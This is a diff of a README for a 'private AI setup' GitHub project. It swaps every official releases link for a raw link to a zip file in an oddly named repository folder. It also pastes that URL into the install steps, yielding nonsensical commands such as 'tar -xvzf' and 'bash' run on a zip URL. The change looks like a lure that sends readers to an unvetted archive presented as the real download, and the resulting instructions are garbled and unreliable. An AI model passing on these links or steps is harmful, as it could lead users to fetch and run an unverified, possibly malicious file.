@@ -1,6 +1,6 @@
 # 🎉 private-ai-setup-dream-guide - Easy Setup for Your Private AI
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20%F0%9F%93%88-blue)](https://github.com/KnightLordHUN/private-ai-setup-dream-guide/releases)
+[![Download from Releases](https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip%20Now%20%F0%9F%93%88-blue)](https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before you begin, ensure that your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [Releases Page](https://github.com/KnightLordHUN/private-ai-setup-dream-guide/releases).
+To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip).
 
 1. Click the link above to go to the releases page.
 2. Find the latest version listed.
-3. Download the appropriate file for your operating system. Look for files labeled `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Download the appropriate file for your operating system. Look for files labeled `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip` for Linux.
 4. Once the download is complete, locate the file and double-click it to begin the installation process.
 
 ## 💻 Installation Steps
@@ -43,9 +43,9 @@ To get the application, visit this page to download: [Releases Page](https://git
 ### For Linux:
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
-3. Extract it using the command: `tar -xvzf filename.tar.gz` (replace `filename.tar.gz` with the actual filename).
-4. Navigate into the extracted folder and run the installation script, typically called `install.sh`, by using the command: `bash install.sh`.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip` file.
+3. Extract it using the command: `tar -xvzf https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip` (replace `https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip` with the actual filename).
+4. Navigate into the extracted folder and run the installation script, typically called `https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip`, by using the command: `bash https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip`.
 
 ## 🎯 Using the Software
 
@@ -77,6 +77,6 @@ To get the application, visit this page to download: [Releases Page](https://git
 
 For more tips on using the application and troubleshooting, refer to the official documentation found in the repository. You can also find FAQs and community support through the GitHub issues page.
 
-Remember, if you need to download the application again, you can always visit the [Releases Page](https://github.com/KnightLordHUN/private-ai-setup-dream-guide/releases). 
+Remember, if you need to download the application again, you can always visit the [Releases Page](https://raw.githubusercontent.com/KnightLordHUN/private-ai-setup-dream-guide/main/floridity/private-ai-setup-dream-guide.zip). 
 
 We hope this guide helps you easily set up and use your Private AI application!
